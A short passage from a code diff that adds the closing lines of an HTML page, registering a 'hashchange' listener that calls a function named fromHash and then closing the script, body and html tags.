+addEventListener("hashchange", fromHash);
+fromHash();
+
+</script>
+</body>
+</html>
